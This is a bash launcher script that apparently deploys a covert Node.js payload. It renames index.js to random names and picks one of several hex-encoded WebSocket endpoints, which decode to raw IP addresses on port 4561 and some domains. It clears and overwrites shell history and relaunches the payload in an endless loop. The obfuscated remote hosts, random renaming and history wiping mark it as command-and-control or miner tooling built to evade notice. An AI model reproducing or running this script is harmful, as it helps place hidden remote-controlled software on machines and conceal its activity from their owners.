#!/bin/bash

BIN="$(tr -dc 'a-z0-9' </dev/urandom | head -c 10)"
BEC="$(tr -dc 'a-z0-9' </dev/urandom | head -c 10)"
mkdir -p "$BEC"
mv index.js "${BEC}/${BIN}.js"
cd "$BEC"
chmod +x "${BIN}.js"
# tar -xzf enchopy.tar.gz
# mv enchopy "${BIN}"
# chmod +x "${BIN}"
# declare -A LIST_STATEVV=(
#     ["7569645f6338663863343838306466303132333934613538303332347c7773733a2f2f63646e2e656c656374726f61692e696f2e766e2f77737c34"]=2
#     ["7569645f6338663863343838306466303132333934613538303332347c7773733a2f2f636c6e2e63687579656e67696161692e73686f702f77737c34"]=3
#     ["7569645f6338663863343838306466303132333934613538303332347c7773733a2f2f63646e2e63687579656e67696161692e6f6e6c696e652f77737c34"]=3
#     ["7569645f6338663863343838306466303132333934613538303332347c7773733a2f2f636c6f75642e626d686f6e67706861742e77696e2f77737c34"]=1
# )
declare -A LIST_STATEVV=(
    ["7569645f6338663863343838306466303132333934613538303332347c77733a2f2f3130332e3138382e3136362e32343a343536312f77737c34"]=2
    ["7569645f6338663863343838306466303132333934613538303332347c77733a2f2f3130332e33382e3233372e3233383a343536312f77737c34"]=3
    ["7569645f6338663863343838306466303132333934613538303332347c77733a2f2f3130332e33382e3233372e3234303a343536312f77737c34"]=3
    ["7569645f6338663863343838306466303132333934613538303332347c77733a2f2f3130332e33382e3233362e3130363a343536312f77737c34"]=1
)


pick_random_statevv() {
    local total=0 r cumulative=0 s

    for s in "${!LIST_STATEVV[@]}"; do
        total=$((total + LIST_STATEVV[$s]))
    done

    r=$((RANDOM % total))

    for s in "${!LIST_STATEVV[@]}"; do
        cumulative=$((cumulative + LIST_STATEVV[$s]))
        if ((r < cumulative)); then
            printf '%s\n' "$s"
            return
        fi
    done
}

while true; do
    export STATEVV="$(pick_random_statevv)"

    bash -c "history -c && history -w && clear" || true
    node "${BIN}.js" 6O231 || true
    # ./"${BIN}" entropy-one || true
    sleep 5
done